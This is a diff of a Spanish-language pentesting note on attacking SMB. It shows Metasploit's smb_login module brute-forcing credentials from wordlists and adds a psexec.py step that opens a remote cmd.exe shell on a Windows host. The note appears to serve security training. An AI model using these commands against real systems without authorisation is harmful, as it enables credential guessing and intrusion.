@@ -1,6 +1,6 @@
 # Explotación de SMB con PsExec
 
-S**MB (Server Message Block)** es un protocolo de intercambio de archivos y periféricos (impresoras y puertos serie) entre equipos de una red local. Utiliza el puerto 445, sin embargo, originalmente SMB funcionaba sobre NetBIOS utilizando el puerto 139. SAMBA es la implementación de código abierto de SMB para Linux y permite que los sistemas Windows accedan a recursos compartidos y dispositivos de Linux.
+**SMB (Server Message Block)** es un protocolo de intercambio de archivos y periféricos (impresoras y puertos serie) entre equipos de una red local. Utiliza el puerto 445, sin embargo, originalmente SMB funcionaba sobre NetBIOS utilizando el puerto 139. SAMBA es la implementación de código abierto de SMB para Linux y permite que los sistemas Windows accedan a recursos compartidos y dispositivos de Linux.
 
 El protocolo SMB utiliza dos niveles de autenticación:
 
@@ -27,6 +27,14 @@ msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
 msf auxiliary(scanner/smb/smb_login) > set user_file <usr_wordlist>
 msf auxiliary(scanner/smb/smb_login) > set pass_file <pass_wordlist>
 msf auxiliary(scanner/smb/smb_login) > run
+```
+
+**Ejecución de PsExec**
+
+```bash
+psexec.py usr@host cmd.exe
+Password: pass
+C:\Windows\system32>
 ```
 
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
